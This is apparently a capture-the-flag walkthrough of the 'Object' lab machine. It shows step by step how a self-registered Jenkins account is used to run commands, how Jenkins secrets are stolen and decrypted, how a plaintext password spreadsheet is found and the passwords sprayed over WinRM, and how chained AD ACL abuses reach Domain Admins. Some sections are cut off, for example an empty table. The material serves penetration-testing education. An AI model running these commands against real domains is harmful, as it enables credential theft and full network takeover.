<h2 id="attack-chain">Attack chain</h2>
<p>Object is an Active Directory permission chain:</p>
<ul>
<li><strong>Every open port is a potential entry point.</strong> Web services, remote management, and unusual ports all deserve investigation.</li>
<li><strong>Enumerate before you exploit.</strong> Rushing to run exploits without understanding what's running wastes time and can break things.</li>
<li><strong>Follow the data.</strong> Configuration files, stored credentials, and service accounts tell you where to go next.</li>
<li><strong>In Active Directory, access is a chain.</strong> One account's permissions lead to another. BloodHound visualizes this chain so you can plan the entire escalation path before executing it.</li>
<li><strong>When you're blocked, pivot.</strong> Firewall blocking reverse shells? Find another way to get data out - write to files, use allowed protocols, read outputs from the tool itself.</li>
</ul>
<hr>
<h2 id="2-reconnaissance-nmap">2. Reconnaissance: Nmap</h2>

<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.96.147 -Pn
nmap -p 80,5985,8080 -sCV 10.129.96.147
</code></pre>
<h3 id="what-we-found">What we found</h3>
<pre><code>80/tcp   open  http    Microsoft IIS httpd 10.0  (Mega Engines website)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0  (WinRM)
8080/tcp open  http    Jetty 9.4.43.v20210629  (Jenkins)
</code></pre>

<p>Nmap is always step one. We use <code>-p-</code> to scan <strong>all 65535 ports</strong> (not just the top 1000) because services are often hidden on non-standard ports. <code>--min-rate 10000</code> speeds it up. <code>-Pn</code> skips the host discovery ping (Windows often blocks ICMP which would cause Nmap to think the host is down).</p>
<p>The <code>-sCV</code> flag on the second scan runs <strong>service version detection</strong> (<code>-sV</code>) and <strong>default scripts</strong> (<code>-sC</code>) to fingerprint exactly what is running on each port.</p>

<ul>
<li>Port <strong>80</strong> = website, look for info leakage, domains, links</li>
<li>Port <strong>5985</strong> = WinRM (Windows Remote Management) - this is how we get a shell if we find credentials</li>
<li>Port <strong>8080</strong> = running Jetty (Java web server), not IIS - this suggests a separate application, likely Jenkins based on the robots.txt disallow</li>
</ul>
<hr>
<h2 id="3-web-enumeration-port-80">3. Web Enumeration: Port 80</h2>

<pre><code class="language-bash" data-language="bash">echo "10.129.96.147 object.htb" | sudo tee -a /etc/hosts
</code></pre>
<p>Browse to <code>http://object.htb</code> - static marketing page for "Mega Engines". The page mentions an "automation server" and links to port 8080.</p>

<p>Add discovered hostnames to <code>/etc/hosts</code>. Web applications often behave differently when accessed by hostname vs IP (virtual hosting). The link to port 8080 tells us what Jenkins is - the company's automation server.</p>

<p>The website itself has nothing exploitable (no login forms, no dynamic content). But it gives us the hostname and confirms Jenkins is intentionally exposed. That becomes our primary target.</p>
<hr>
<h2 id="4-jenkins-port-8080">4. Jenkins: Port 8080</h2>

<p>Browse to <code>http://object.htb:8080</code> - redirects to Jenkins login. Jenkins version <strong>2.317</strong> shown in footer.</p>
<p><strong>Registered a new account</strong> (Jenkins allows self-registration by default).</p>

<p>Jenkins is a Continuous Integration / Continuous Deployment (CI/CD) automation server. Its entire purpose is to <strong>run code automatically</strong>. If we can create and trigger a Jenkins job, we get code execution on the server - which in this case is a Windows machine.</p>
<p>We register an account because:</p>
<ul>
<li>No default credentials work</li>
<li>No known unauthenticated exploits for this version</li>
<li>Jenkins allows user registration by default unless the admin locked it down</li>
</ul>

<p>Check if a web application allows self-registration before trying to brute force or exploit. It saves time. Once inside, the question becomes: <em>what can a low-privilege authenticated user do?</em></p>
<hr>
<h2 id="5-command-execution-via-jenkins-job">5. Command Execution via Jenkins Job</h2>

<ol>
<li>Click <strong>New Item</strong> → name it <code>pwn</code> → <strong>Freestyle project</strong></li>
<li>Under <strong>Build Triggers</strong> → check <strong>Build periodically</strong> → enter <code>* * * * *</code> (every minute)</li>
<li>Under <strong>Build Steps</strong> → <strong>Add build step</strong> → <strong>Execute Windows batch command</strong></li>
<li>Enter command: <code>whoami</code></li>
<li>Save → wait 1 minute → check Console Output</li>
</ol>
<p><strong>Result:</strong></p>
<pre><code>C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\pwn&gt;whoami
object\oliver
</code></pre>

<p>A Jenkins "Freestyle project" is essentially a script runner. The <strong>Build periodically</strong> trigger uses cron syntax - <code>* * * * *</code> means run every minute. This gives us a reliable way to execute any Windows command on the server.</p>
<p>We start with <code>whoami</code> to confirm:</p>
<ol>
<li>We have execution</li>
<li>Which user the commands run as</li>
</ol>
<p>Running as <code>object\oliver</code> tells us Jenkins is running under the <code>oliver</code> Windows user account. This matters because it defines what files and directories we can access.</p>
<h3 id="why-not-a-reverse-shell">Why not a reverse shell?</h3>
<p>We'll discover in the next step that <strong>all outbound TCP is blocked by a firewall</strong>. So we can't connect back to our Kali. Instead, we use the Jenkins job output (the Console Output page) as our data channel - we run commands and read the output in the browser.</p>

<p>CI/CD tools are powerful because they're <strong>designed to run commands</strong>. That's not a vulnerability - it's the feature we're abusing. The attacker's goal here is simple: find a way to read output from commands we control.</p>
<hr>
<h2 id="6-firewall-discovery">6. Firewall Discovery</h2>

<p>Changed the batch command to:</p>
<pre><code class="language-powershell" data-language="powershell">powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},Enabled,Action"
</code></pre>
<p><strong>Result:</strong> A rule called <code>BlockOutboundDC</code> blocks <strong>all outbound TCP</strong>.</p>

<p>Before spending time crafting reverse shells that won't work, we check the firewall rules. This is a critical enumeration step on Windows - Windows Firewall rules are readable by normal users and tell you exactly what traffic is allowed.</p>

<p>When your reverse shell doesn't connect back, don't keep trying variations blindly. Diagnose the problem first. Check firewall rules, proxy settings, and network restrictions. Here, ICMP (ping) still worked outbound - which confirms the box is alive but TCP is blocked.</p>
<p>The implication: <strong>we cannot get an interactive reverse shell</strong>. We must do all our work through the Jenkins console output mechanism.</p>

<h2 id="7-stealing-jenkins-credentials">7. Stealing Jenkins Credentials</h2>

<p><strong>Step 1 - Find the admin user folder:</strong></p>
<pre><code>powershell -c "ls ..\..\users"
</code></pre>
<p>Result: <code>admin_17207690984073220035</code></p>
<p><strong>Step 2 - Read the admin's config.xml:</strong></p>
<pre><code>type ..\..\users\admin_17207690984073220035\config.xml
</code></pre>
<p>Found encrypted password for user <code>oliver</code>:</p>
<pre><code>{REDACTED_ENCODED_LAB_MATERIAL}
</code></pre>
<p><strong>Step 3 - Read master.key:</strong></p>
<pre><code>type ..\..\secrets\master.key
</code></pre>
<p>Result: <code>f673fdb0c4fcc339...</code></p>
<p><strong>Step 4 - Read hudson.util.Secret (binary file, so base64 encode it):</strong></p>
<pre><code>powershell -c "[convert]::ToBase64String((cat ..\..\secrets\hudson.util.Secret -Encoding byte))"
</code></pre>
<p>Result: <code>gWFQFlTxi+xRdwcz6KgADwG+...</code></p>

<p>Jenkins stores credentials (used in pipelines and jobs) encrypted in XML files on disk. The encryption is not unbreakable - it uses a known algorithm (AES) with keys stored in predictable locations:</p>
<table tabindex="0" aria-label="7. Stealing Jenkins Credentials data table">
<thead>
<tr>
<th scope="col">File</th>
<th scope="col">Purpose</th>
</tr>

<p>Because Jenkins runs as <code>oliver</code> and these files are in oliver's home directory, we can read them all.</p>
<p>We base64 encode <code>hudson.util.Secret</code> because it's a <strong>binary file</strong> - printing it directly would garble the output. Base64 encoding makes it safe to copy/paste as text.</p>

<p>Look for <strong>stored credentials</strong> when you have file system access. CI/CD systems like Jenkins need to store credentials to connect to other systems (source control, deployment targets). Those stored credentials often expose password reuse - they often reuse passwords across services.</p>
<p>The path <code>..\..\</code> from the workspace navigates up to the <code>.jenkins</code> root directory. Knowing the Jenkins directory structure (publicly documented) lets you go straight to the valuable files.</p>

<h2 id="8-decrypting-the-password">8. Decrypting the Password</h2>

<p>On Kali:</p>
<pre><code class="language-bash" data-language="bash"># Save master.key
echo -n "f673fdb0c4fcc339..." &gt; master.key

# Decode hudson.util.Secret from base64 to binary
echo "gWFQFlTxi+xRdwcz..." | base64 -d &gt; hudson.util.Secret

# Create a credentials XML with the encrypted password
cat &gt; config.xml &lt;&lt; 'EOF'
&lt;com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
  &lt;username&gt;oliver&lt;/username&gt;
  &lt;password&gt;{REDACTED_ENCODED_LAB_MATERIAL}&lt;/password&gt;
&lt;/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
EOF

# Download the decryption script
wget https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py

# Install dependency and run
pip install pycryptodome
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret config.xml
</code></pre>
<p><strong>Result:</strong> <code>c1cdfun_d2434</code></p>

<p>Jenkins uses AES encryption. The <code>pwn_jenkins</code> script implements the exact same decryption algorithm Jenkins uses internally. Given the three files (master.key, hudson.util.Secret, credentials XML), it can reverse the encryption completely - no brute force needed.</p>

<p>Encryption is only as strong as the key management. Jenkins stores everything needed to decrypt on the same disk. This is a design trade-off (usability vs security), but for a pentester it means: <strong>if you can read the files, you can decrypt the secrets</strong>.</p>

<h2 id="9-winrm-foothold-oliver">9. WinRM Foothold: oliver</h2>

<pre><code class="language-powershell" data-language="powershell">type C:\Users\oliver\Desktop\user.txt

<p>WinRM (port 5985) is Windows' remote management protocol - like SSH for Windows. <code>evil-winrm</code> is a Ruby tool that wraps WinRM into an interactive shell with extra features (file upload/download, PowerShell modules).</p>
<p>The decrypted Jenkins credential is worth testing against WinRM because Jenkins was storing Oliver's Windows password.</p>

<p>The Jenkins credential was also Oliver's Windows credential, so it opened WinRM.</p>

<h2 id="10-active-directory-enumeration-bloodhound">10. Active Directory Enumeration: BloodHound</h2>

<p>The machine already had SharpHound.exe and a completed zip in oliver's Documents folder. Downloaded the zip and imported into BloodHound.</p>
<pre><code class="language-powershell" data-language="powershell">download C:\Users\oliver\Documents\20260609084858_BloodHound.zip
</code></pre>
<p>On Kali:</p>
<pre><code class="language-bash" data-language="bash">sudo neo4j start
bloodhound &amp;
# Import zip, mark oliver as Owned
# Analysis → Find Shortest Paths to Domain Admins
</code></pre>
<p><strong>Result:</strong> <code>oliver → ForceChangePassword → smith → GenericWrite → maria → WriteOwner → Domain Admins</code></p>

<p>In Active Directory, <strong>permissions are everything</strong>. A user might not have admin rights directly, but might have permissions <em>over other objects</em> that eventually lead to admin. Manually checking every object's ACL is impractical - BloodHound automates this by:</p>
<ol>
<li><strong>SharpHound</strong> : runs on the target, collects all AD objects, group memberships, and ACLs</li>
<li><strong>BloodHound</strong> : loads the data into a graph database and finds attack paths using graph theory</li>
</ol>
<p>The "Shortest Path to Domain Admins" query finds the minimum number of hops from your owned user to DA.</p>

<h2 id="11-ad-abuse-1-forcechangepassword-oliver-smith">11. AD Abuse 1: ForceChangePassword: oliver → smith</h2>

<p>In Evil-WinRM as oliver, uploaded PowerView.ps1 then:</p>
<pre><code class="language-powershell" data-language="powershell">Import-Module .\PowerView.ps1
$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity smith -AccountPassword $newpass
</code></pre>
<p>Then connected as smith:</p>
<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.96.147 -u smith -p REDACTED
</code></pre>

<p><code>ForceChangePassword</code> is an AD permission that lets you set a user's password to anything - without knowing their current password. PowerView's <code>Set-DomainUserPassword</code> automates this.</p>
<p>We need to be smith because smith has the next permission in the chain (<code>GenericWrite</code> over maria). We can't abuse that permission as oliver.</p>
<h3 id="why-powerview">Why PowerView?</h3>
<p>PowerView is a PowerShell library for AD enumeration and manipulation. It wraps complex LDAP/AD calls into simple functions. It's part of PowerSploit and is the common tool for AD abuse in engagements.</p>

<p><code>ForceChangePassword</code> is a legitimate AD delegation feature (help desk workers can reset passwords). But when it's misconfigured on a regular user account rather than a help desk group, it becomes an attack vector. Check what you can <strong>do to other objects</strong>, not just what you can do directly.</p>
<hr>
<h2 id="12-ad-abuse-2-genericwrite-smith-maria">12. AD Abuse 2: GenericWrite: smith → maria</h2>

<p>As smith with PowerView:</p>
<pre><code class="language-powershell" data-language="powershell"># Write a script to copy maria's files
Set-Content -Path C:\programdata\check.ps1 -Value 'Copy-Item C:\Users\maria\Desktop\Engines.xls C:\programdata\Engines.xls'

# Set that script as maria's logon script via GenericWrite
Set-DomainObject -Identity maria -SET @{scriptpath='C:\programdata\check.ps1'}
</code></pre>
<p>Wait ~5-10 seconds → the file appears at <code>C:\programdata\Engines.xls</code></p>
<pre><code class="language-powershell" data-language="powershell">download C:\programdata\Engines.xls
</code></pre>
<h3 id="why-genericwrite-allows-this">Why GenericWrite allows this</h3>
<p><code>GenericWrite</code> lets you write to any <strong>non-protected</strong> attribute of an AD user object. The <code>scriptpath</code> attribute defines a logon script - a script that runs every time the user logs in (or in this case, every time an automated task simulates a login).</p>
<p>The box has a scheduled task running as maria that continuously executes whatever is set as her logon script. This is confirmed because the file appears within seconds of setting the scriptpath.</p>
<h3 id="why-we-target-engines-xls">Why we target Engines.xls</h3>
<p>After listing maria's Desktop directory (by setting the script to <code>dir C:\Users\maria\Desktop &gt; C:\programdata\out.txt</code>), we found <code>Engines.xls</code> - an Excel file that likely contains credentials based on its name and context.</p>

<p><code>GenericWrite</code> has many potential abuses. The logon script method is ideal here because:</p>
<ol>
<li>We can't get a reverse shell (firewall)</li>
<li>The automation runs repeatedly - we get results within seconds</li>
<li>We can chain multiple scripts to exfiltrate any file we want</li>
</ol>
<p>Think of it as using maria's account as a <strong>file copy robot</strong> that we control via her AD attributes.</p>
<hr>
<h2 id="13-finding-maria-s-password-engines-xls">13. Finding maria's Password: Engines.xls</h2>
<h3 id="what-we-found-2">What we found</h3>
<pre><code>Name                      | Chamber Username | Chamber Password
Internal Combustion Engine | maria            | d34gb8@
Stirling Engine            | maria            | 0de_434_d545
Diesel Engine              | maria            | W3llcr4ft3d_4cls
</code></pre>
<h3 id="testing-passwords">Testing passwords</h3>
<pre><code class="language-bash" data-language="bash">netexec winrm 10.129.96.147 -u maria -p maria-pass.txt
</code></pre>
<p><strong>Result:</strong> <code>W3llcr4ft3d_4cls</code> - <code>(Pwn3d!)</code></p>

<p>The Excel file is an inventory spreadsheet with passwords stored in plaintext. This is a common finding in real engagements - employees store credentials in Excel/Word documents on their desktops.</p>
<p>We test all three passwords against WinRM because we don't know which one is maria's current Windows password. <code>netexec</code> (formerly crackmapexec) makes spray testing fast.</p>

<p><strong>A password spreadsheet can bypass otherwise strong controls.</strong> A user keeping a password spreadsheet on their desktop defeats all the technical security controls. Finding and testing all discovered credentials is essential - even if they look like credentials for other systems, they might be reused.</p>
<hr>
<h2 id="14-winrm-as-maria">14. WinRM as maria</h2>

<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.96.147 -u maria -p REDACTED
</code></pre>

<p>We now have access as maria, who has <code>WriteOwner</code> over Domain Admins - the final step to full compromise.</p>
<hr>
<h2 id="15-ad-abuse-3-writeowner-maria-domain-admins">15. AD Abuse 3: WriteOwner: maria → Domain Admins</h2>

<p>As maria, imported PowerView then:</p>
<pre><code class="language-powershell" data-language="powershell"># Step 1: Take ownership of the Domain Admins group
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria

# Step 2: As owner, grant maria full rights over the group
Add-DomainObjectAcl -PrincipalIdentity maria -TargetIdentity "Domain Admins" -Rights All

# Step 3: Add maria to Domain Admins
net group "Domain Admins" maria /add /domain
</code></pre>
<p>Then <strong>exited and reconnected</strong> to refresh the session token:</p>
<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.96.147 -u maria -p REDACTED
</code></pre>
<h3 id="why-three-steps">Why three steps?</h3>
<p>This is how Windows permission delegation works:</p>
<ol>
<li><strong>WriteOwner</strong> only lets you <em>change who owns the object</em> : it doesn't give you any other rights yet</li>
<li><strong>Once you're the owner</strong>, Windows lets owners modify the object's DACL (security descriptor) regardless of existing ACEs - so we grant ourselves <code>All</code> rights</li>
<li><strong>With All rights</strong>, we can finally add members to the group</li>
</ol>
<h3 id="why-reconnect">Why reconnect?</h3>
<p>Windows access tokens (your "session credentials") are generated at login time and include group memberships at that moment. Adding yourself to a group mid-session doesn't update your current token. You must <strong>start a new session</strong> to get a token that includes the new group membership.</p>

<p><code>WriteOwner</code> is an often-overlooked permission. Many defenders focus on <code>WriteDACL</code> or <code>GenericAll</code>, but ownership is even more powerful - it bypasses the DACL entirely. The three-step process mirrors what an admin would do legitimately when managing group ownership.</p>
